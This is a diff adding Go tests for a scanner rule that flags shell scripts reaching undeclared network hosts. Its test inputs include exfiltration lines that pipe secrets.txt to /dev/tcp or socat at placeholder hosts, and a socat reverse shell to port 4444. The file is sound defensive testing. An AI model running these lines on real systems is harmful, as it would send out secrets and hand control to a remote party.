@@ -472,3 +472,258 @@ func TestShellSegments(t *testing.T) {
 		t.Errorf("segments = %q, want %q", strings.Join(flat, "|"), want)
 	}
 }
+
+// s6ExpectHosts runs each shell line as a script with nothing declared, and
+// again with its host declared: the first must report the host, the second
+// nothing.
+func s6ExpectHosts(t *testing.T, forms map[string]string) {
+	t.Helper()
+	for line, host := range forms {
+		run := func(manifest string) map[string]Finding {
+			return s6Run(t, manifest, map[string]string{"run.sh": "#!/bin/sh\n" + line + "\n"})
+		}
+		got := run(`{"capabilities":{"exec":{"commands":["x"]}}}`)
+		if f, ok := got["S6/undeclared-network"]; !ok || f.Detail["host"] != host {
+			t.Errorf("%q: undeclared-network = %+v (found %v), want %s", line, f.Detail, ok, host)
+		}
+		if f, ok := run(`{"capabilities":{"network":{"egress":["` + host + `"]},"exec":{"commands":["x"]}}}`)["S6/undeclared-network"]; ok {
+			t.Errorf("%q with %s declared: %+v", line, host, f.Detail)
+		}
+	}
+}
+
+// s6ExpectNoHost is the counterpart: each line looks like a network form and
+// reaches nothing but the declared host.
+func s6ExpectNoHost(t *testing.T, lines []string) {
+	t.Helper()
+	for _, line := range lines {
+		got := s6Run(t, `{"capabilities":{"network":{"egress":["get.example.test"]},"exec":{"commands":["x"]}}}`, map[string]string{"run.sh": "#!/bin/sh\n" + line + "\n"})
+		if f, ok := got["S6/undeclared-network"]; ok {
+			t.Errorf("%q: unexpected %+v", line, f.Detail)
+		}
+	}
+}
+
+// bash opens a TCP or UDP connection from a redirection to /dev/tcp/HOST/PORT
+// or /dev/udp/HOST/PORT, with no network command on the line.
+func TestS6ReadsADevTCPRedirection(t *testing.T) {
+	s6ExpectHosts(t, map[string]string{
+		"exec 3<>/dev/tcp/10.1.2.3/80":                          "10.1.2.3",
+		"cat secrets.txt > /dev/tcp/h.example.org/443":          "h.example.org",
+		"cat secrets.txt >>/dev/tcp/h.example.org/443":          "h.example.org",
+		"echo hi >/dev/udp/10.1.2.3/53":                         "10.1.2.3",
+		"cat < /dev/tcp/h.example.org/80":                       "h.example.org",
+		"exec 3<> \"/dev/tcp/h.example.org/443\"":               "h.example.org",
+		"exec 3<>/dev/tcp/2001:db8::1/80":                       "2001:db8::1",
+		"(echo hi) &>/dev/tcp/h.example.org/80":                 "h.example.org",
+		"{ printf x; } 2>/dev/null >/dev/tcp/h.example.org/80":  "h.example.org",
+		"bash -c 'cat f >/dev/tcp/h.example.org/80'":            "h.example.org",
+		"out=\"$(cat f >/dev/tcp/h.example.org/80)\"":           "h.example.org",
+		"H=h.example.org; exec 3<>/dev/tcp/$H/80":               "h.example.org",
+		"H=h.example.org; exec 3<>/dev/tcp/${H}/80":             "h.example.org",
+		"exec 3<>/dev/TCP/H.Example.org/80":                     "h.example.org",
+		"if cat f >/dev/tcp/h.example.org/80; then echo ok; fi": "h.example.org",
+	})
+}
+
+func TestS6DevTCPThatIsNotAHost(t *testing.T) {
+	s6ExpectNoHost(t, []string{
+		"cat /dev/null > out.txt",
+		"exec 3<>/dev/tcp/localhost/80",
+		"exec 3<>/dev/tcp/127.0.0.1/80",
+		"exec 3<>/dev/tcp/::1/80",
+		"exec 3<>/dev/tcp/$UNKNOWN/80",
+		"exec 3<>/dev/tcp/",
+		"exec 3<>/dev/tcp",
+		"echo /dev/tcp/h.example.org/80 > notes.txt",
+		"echo \"/dev/tcp/h.example.org/80 is a bash feature\"",
+		"ls /dev/tcp/h.example.org/80",
+		"cat <<< \"/dev/tcp/h.example.org/80\"",
+		"cat <<EOF\nEOF",
+		"echo hi > /dev/stderr",
+		"exec 3<>/dev/tcp/get.example.test/80",
+	})
+}
+
+// socat reaches the host its connecting address names.
+func TestS6ReadsASocatAddress(t *testing.T) {
+	s6ExpectHosts(t, map[string]string{
+		"socat - TCP:h.example.org:443":                             "h.example.org",
+		"socat - tcp4:10.1.2.3:80":                                  "10.1.2.3",
+		"socat - TCP6:[2001:db8::1]:80":                             "2001:db8::1",
+		"socat - OPENSSL:h.example.org:443,verify=0":                "h.example.org",
+		"socat - TCP-CONNECT:h.example.org:80":                      "h.example.org",
+		"socat -u FILE:secrets.txt UDP:10.1.2.3:53":                 "10.1.2.3",
+		"socat - UDP-SENDTO:10.1.2.3:53":                            "10.1.2.3",
+		"socat EXEC:'bash -li',pty,stderr TCP:10.1.2.3:4444":        "10.1.2.3",
+		"socat TCP-LISTEN:8080,fork TCP:h.example.org:80":           "h.example.org",
+		"/usr/bin/socat - TCP:h.example.org:443":                    "h.example.org",
+		"sudo socat - 'TCP:h.example.org:443'":                      "h.example.org",
+		"cat f | socat - OPENSSL-CONNECT:h.example.org:443":         "h.example.org",
+		"H=h.example.org; socat - TCP:$H:443":                       "h.example.org",
+		"bash -c 'socat - TCP:10.1.2.3:443'":                        "10.1.2.3",
+		"socat -d -d - TCP4:10.1.2.3:443,connect-timeout=5,fork":    "10.1.2.3",
+		"socat openssl:h.example.org:443,verify=0 stdio":            "h.example.org",
+		"socat UDP4-DATAGRAM:10.1.2.3:53 -":                         "10.1.2.3",
+		"socat - OPENSSL:h.example.org:443,cafile=/etc/ca.pem,fork": "h.example.org",
+	})
+}
+
+func TestS6SocatThatIsNotAHost(t *testing.T) {
+	s6ExpectNoHost(t, []string{
+		"socat TCP-LISTEN:8080,fork EXEC:cat",
+		"socat TCP4-LISTEN:8080,reuseaddr STDOUT",
+		"socat - TCP:localhost:80",
+		"socat - TCP:127.0.0.1:80",
+		"socat - TCP6:[::1]:80",
+		"socat - TCP:$UNKNOWN:80",
+		"socat - UNIX-CONNECT:/var/run/app.sock",
+		"socat -V",
+		"socat - FILE:notes.txt",
+		"socat - EXEC:'cat notes.txt'",
+		"echo TCP:10.1.2.3:80",
+		"socat - TCP:get.example.test:443",
+	})
+}
+
+// git's scp-like remote, user@host:path, in a command that takes a remote.
+func TestS6ReadsAGitScpLikeRemote(t *testing.T) {
+	s6ExpectHosts(t, map[string]string{
+		"git clone git@10.1.2.3:x.git":                                     "10.1.2.3",
+		"git clone git@git.example.org:org/repo.git":                       "git.example.org",
+		"git clone --depth 1 git@git.example.org:org/repo.git out":         "git.example.org",
+		"git -C src pull deploy@git.example.org:org/repo.git":              "git.example.org",
+		"git -c core.sshCommand=ssh push git@git.example.org:o/r HEAD":     "git.example.org",
+		"git remote add origin git@git.example.org:org/repo.git":           "git.example.org",
+		"git remote set-url origin git@git.example.org:org/r.git":          "git.example.org",
+		"git submodule add git@git.example.org:org/lib.git lib":            "git.example.org",
+		"git ls-remote git@[2001:db8::1]:org/repo.git":                     "2001:db8::1",
+		"git fetch 'git@git.example.org:org/repo.git' main":                "git.example.org",
+		"/usr/bin/git clone git@git.example.org:org/repo.git":              "git.example.org",
+		"GIT_SSH_COMMAND='ssh -i k' git clone git@git.example.org:o/r.git": "git.example.org",
+		"U=git@git.example.org:o/r.git; git clone $U":                      "git.example.org",
+		"git pull git@git.example.org:o/r.git && echo done":                "git.example.org",
+	})
+}
+
+func TestS6GitThatIsNotAHost(t *testing.T) {
+	s6ExpectNoHost(t, []string{
+		"git commit -m \"thanks ops@example.org\"",
+		"git commit -m \"fix: ops@example.org: thanks\"",
+		"git config user.email ops@example.org",
+		"git log --author=ops@example.org",
+		"git status",
+		"git clone ./local/dir out",
+		"git clone file:///srv/repo out",
+		"git clone git@localhost:x.git",
+		"git clone git@127.0.0.1:x.git",
+		"git push origin HEAD:refs/heads/main",
+		"git push origin feature.branch:main",
+		"git fetch origin refs/heads/a.b:refs/remotes/origin/a.b",
+		"git remote add origin ops@example.org",
+		"git clone git@get.example.test:x.git",
+		"echo git@git.example.org:org/repo.git",
+		"git tag -a v1 -m \"contact ops@example.org:\"",
+	})
+}
+
+// docker pull and push name a registry as the first path component of an
+// image reference when it holds a dot or a port.
+func TestS6ReadsAContainerImageRegistry(t *testing.T) {
+	s6ExpectHosts(t, map[string]string{
+		"docker pull 10.1.2.3:5000/img":                               "10.1.2.3",
+		"docker pull registry.example.org:5000/team/img:1.2":          "registry.example.org",
+		"docker pull registry.example.org/img":                        "registry.example.org",
+		"docker pull ghcr.io/org/app:1":                               "ghcr.io",
+		"docker push 10.1.2.3:5000/img:latest":                        "10.1.2.3",
+		"docker image pull [2001:db8::1]:5000/img":                    "2001:db8::1",
+		"docker pull --platform linux/amd64 registry.example.org/img": "registry.example.org",
+		"sudo docker pull registry.example.org/img":                   "registry.example.org",
+		"podman pull registry.example.org/img":                        "registry.example.org",
+		"docker pull -q Registry.Example.org/img@sha256:ab":           "registry.example.org",
+		"R=10.1.2.3:5000; docker pull $R/img":                         "10.1.2.3",
+		"docker pull \"registry.example.org:5000/img\"":               "registry.example.org",
+		"bash -c 'docker pull 10.1.2.3:5000/img'":                     "10.1.2.3",
+	})
+}
+
+func TestS6ContainerImageThatIsNotAHost(t *testing.T) {
+	s6ExpectNoHost(t, []string{
+		"docker pull ubuntu:22.04",
+		"docker pull library/ubuntu",
+		"docker pull myorg/app:1.2.3",
+		"docker pull nginx:1.25.3",
+		"docker pull busybox@sha256:abcd",
+		"docker pull example.org",
+		"docker pull localhost:5000/img",
+		"docker pull 127.0.0.1:5000/img",
+		"docker pull --platform linux/amd64 alpine",
+		"docker images registry.example.org/img",
+		"docker tag app registry.example.org/img",
+		"docker build -t registry.example.org/img .",
+		"docker pull get.example.test/img",
+		"echo docker pull registry.example.org/img",
+	})
+}
+
+// An IPv6 address written without brackets, as a word of a network command
+// or an ssh-family destination.
+func TestS6ReadsAnUnbracketedIPv6Address(t *testing.T) {
+	s6ExpectHosts(t, map[string]string{
+		"nc -6 2001:db8::1 22":                   "2001:db8::1",
+		"nc 2001:db8::1 22":                      "2001:db8::1",
+		"telnet 2001:db8::1":                     "2001:db8::1",
+		"ssh admin@2001:db8::1":                  "2001:db8::1",
+		"ssh 2001:db8::1 uptime":                 "2001:db8::1",
+		"ssh -p 2222 admin@2001:DB8::1":          "2001:db8::1",
+		"sftp admin@2001:db8::1":                 "2001:db8::1",
+		"ssh -6 -i key admin@fd00:1:2:3:4:5:6:7": "fd00:1:2:3:4:5:6:7",
+		"ssh $USER@2001:db8::1":                  "2001:db8::1",
+		"ssh -J jump@2001:db8::2 prod":           "2001:db8::2",
+		"sudo nc -w 3 2001:db8::1 22":            "2001:db8::1",
+		"H=2001:db8::1; nc $H 22":                "2001:db8::1",
+	})
+}
+
+func TestS6IPv6ThatIsNotAHost(t *testing.T) {
+	s6ExpectNoHost(t, []string{
+		"nc -l ::1 80",
+		"nc ::1 80",
+		"ssh ::1",
+		"ssh admin@::1",
+		"nc 12:34:56 80",
+		"nc 1:2 80",
+		"ssh user@aa:bb:cc:dd:ee:ff",
+		"wakeonlan aa:bb:cc:dd:ee:ff",
+		"curl -H \"Date: 12:34:56\" https://get.example.test/",
+		"nc -l 2001:db8::1 80",
+		"nc -s 2001:db8::5 get.example.test 80",
+		"echo 2001:db8::1",
+		"ssh admin@fe80::1%eth0",
+		"nc 2001:db8::zz 80",
+		"nc 2001:db8:1:2:3:4:5:6:7 80",
+		"nc ::ffff:127.0.0.1 80",
+	})
+}
+
+// The new readers run on the attacker's text: long operand lists and deep
+// nesting stay fast.
+func TestS6NetworkFormsStayFast(t *testing.T) {
+	ops := strings.Repeat("git@h.example.org:o/r.git ", 40000)
+	redirs := strings.Repeat(">/dev/tcp/h.example.org/80 ", 40000)
+	nested := strings.Repeat("$(echo ", 20000) + "cat f >/dev/tcp/h.example.org/80" + strings.Repeat(")", 20000)
+	for name, script := range map[string]string{
+		"git":      "git clone " + ops,
+		"docker":   "docker pull " + strings.Repeat("registry.example.org:5000/img ", 40000),
+		"socat":    "socat " + strings.Repeat("TCP:h.example.org:80 ", 40000),
+		"redirect": "cat f " + redirs,
+		"ipv6":     "nc " + strings.Repeat("2001:db8::1 ", 40000),
+		"nested":   nested,
+	} {
+		start := time.Now()
+		s6Run(t, `{"capabilities":{"exec":{"commands":["x"]}}}`, map[string]string{"run.sh": "#!/bin/sh\n" + script + "\n"})
+		if d := time.Since(start); d > 3*time.Second {
+			t.Errorf("%s took %v", name, d)
+		}
+	}
+}
